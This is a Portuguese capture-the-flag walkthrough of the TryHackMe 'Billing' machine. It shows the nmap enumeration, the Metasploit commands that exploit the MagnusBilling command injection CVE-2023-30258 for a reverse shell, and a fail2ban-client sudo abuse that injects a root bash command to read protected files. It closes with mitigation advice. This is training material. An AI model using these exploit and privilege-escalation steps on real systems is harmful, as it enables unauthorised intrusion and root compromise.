
## LAB NOTEBOOK: TryHackMe – Billing (Walkthrough Completo)

Data: Julho de 2026  
Dificuldade: Fácil (Easy Linux)  
Alvo IP: 10.65.170.8  
Máquina de Ataque: 10.9.x.x (IP da VPN do TryHackMe)

---

## Visão Geral do Fluxo de Ataque (Kill Chain)

1. Fase 1: Reconhecimento (Enumeration) -> Escaneamento de portas com nmap para identificar serviços expostos.
2. Fase 2: Acesso Inicial (Initial Foothold) -> Exploração da vulnerabilidade CVE-2023-30258 no painel MagnusBilling via Metasploit. Ganho de shell como usuário asterisk.
3. Fase 3: Escala de Privilégios (Privilege Escalation) -> Abuso de permissão mal configurada no sudoers com o binário /usr/bin/fail2ban-client para executar comandos como root.

---

## FASE 1: Reconhecimento e Enumeração

O objetivo inicial é descobrir quais portas estão abertas e quais serviços estão rodando no alvo.

## 1. Escaneamento Completo de Portas

```bash
nmap -sC -sV -p- -T4 10.65.170.8 -oN nmap_full.txt
```

- -sC: Executa os scripts padrão do Nmap para buscar vulnerabilidades comuns ou informações extras.
- -sV: Tenta determinar a versão exata do serviço que está rodando em cada porta.
- -p-: Escaneia todas as 65.535 portas possíveis para evitar perder serviços em portas altas.
- -T4: Ajusta o timing para acelerar o escaneamento sem perder precisão.
- -oN nmap_full.txt: Salva a saída em um arquivo de texto para consulta posterior.

Resultado do Escaneamento:  
O Nmap retorna que a porta 80 (HTTP) está aberta rodando um servidor web Apache. Ao acessar o IP pelo navegador, encontra-se o painel de login do MagnusBilling, um software open-source de billing para telefonia VoIP/Asterisk.

---

## FASE 2: Exploração e Acesso Inicial (RCE Unauthenticated)

Pesquisando por MagnusBilling Exploit, descobre-se que as versões afetadas sofrem com uma vulnerabilidade crítica de Injeção de Comando Remoto Não Autenticada (CVE-2023-30258) localizada no módulo de pagamento Icepay. O parâmetro de entrada não é devidamente sanitizado, permitindo que comandos do Linux sejam acoplados à requisição web.

Para agilizar o processo, utiliza-se o framework Metasploit.

## 1. Configurando e Disparando o Exploit

Abra o terminal na sua máquina de ataque e digite:

```bash
msfconsole
```

Dentro do Metasploit, execute a seguinte sequência:

```bash
search magnusbilling
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS 10.65.170.8
set LHOST 10.9.x.x
run
```

O Metasploit envia uma requisição HTTP maliciosa para o servidor. O servidor processa a injeção de comando e força o Linux a abrir uma conexão de rede reversa de volta para a máquina do atacante na porta configurada.

## 2. Coletando a Flag de Usuário

O exploit funciona e você ganha uma sessão. Ao digitar whoami, descobre-se que o acesso foi obtido como o usuário asterisk.

Para capturar a primeira flag, navega-se até o diretório do usuário local:

```bash
cat /home/magnus/user.txt
```

---

## FASE 3: Escala de Privilégios (De Asterisk para Root)

Como o usuário asterisk possui privilégios limitados, é necessário encontrar uma forma de se tornar o superusuário (root).

## 1. Enumeração Local do Sudo

A primeira verificação em pós-exploração Linux são as permissões de Sudo:

```bash
sudo -l
```

Resultado encontrado:  
O sistema responde que o usuário asterisk pode executar o seguinte comando com privilégios de root sem precisar digitar senha (NOPASSWD):

```text
(root) NOPASSWD: /usr/bin/fail2ban-client
```

## 2. A Vulnerabilidade do Fail2Ban-Client

O fail2ban-client é a ferramenta de linha de comando para gerenciar o serviço Fail2Ban. Para manipular o firewall do sistema, este utilitário roda inerentemente como root.

O erro de configuração do administrador foi dar acesso ao comando completo, em vez de restringi-lo a ações específicas. O parâmetro set do Fail2Ban permite reconfigurar o comportamento do software em tempo de execução, incluindo as ações executadas ao banir um endereço IP.

Execução do ataque para extrair a flag:

## Passo A: Reiniciar o Serviço

```bash
sudo /usr/bin/fail2ban-client restart
```

- Garante que o serviço esteja em um estado limpo e que o jail do sshd esteja ativo na memória.

## Passo B: Injetar a Ação Maliciosa

```bash
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"
```

- set sshd action iptables-multiport actionban: Altera a configuração do módulo do SSH. Redefine o que o Fail2Ban faz no momento exato em que decide banir um IP.
- "/bin/bash -c '...'": Substitui o comando legítimo do firewall por uma chamada ao terminal Bash para executar comandos customizados.
- cat /root/root.txt > /tmp/root.txt: Como o Fail2Ban roda como root, ele lê a flag secreta e a grava no diretório público /tmp/.
- && chmod 777 /tmp/root.txt: Altera as permissões do arquivo criado para 777, liberando a leitura para qualquer usuário do sistema, incluindo o usuário asterisk.

## Passo C: Disparar o Gatilho

A alteração está na memória do Fail2Ban, mas ele ainda não executou a linha de comando porque nenhum IP foi banido. Força-se um banimento manual:

```bash
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```

- Ordena que o Fail2Ban bana o IP local (127.0.0.1). Ao processar o banimento, ele aciona a diretiva actionban modificada, executando o script injetado com privilégios de root.

## Passo D: Captura da Flag de Root

Após o acionamento do gatilho, o arquivo foi copiado com sucesso. Basta lê-lo com o usuário comum:

```bash
cat /tmp/root.txt
```

A flag do root é exibida, concluindo o comprometimento do laboratório.

---

## Como mitigar essa falha? (Lições Aprendidas)

1. Atualização de Software: Atualizar o MagnusBilling para corrigir a CVE-2023-30258, eliminando o vetor de entrada.
2. Princípio do Menor Privilégio no Sudoers: Não dar acesso cego a binários com parâmetros interativos ou de configuração como o set. No arquivo /etc/sudoers, a permissão deveria ser restrita estritamente a comandos de leitura, por exemplo:
    
    ```text
    asterisk ALL=(root) NOPASSWD: /usr/bin/fail2ban-client status *, /usr/bin/fail2ban-client get *
    ```
    

---

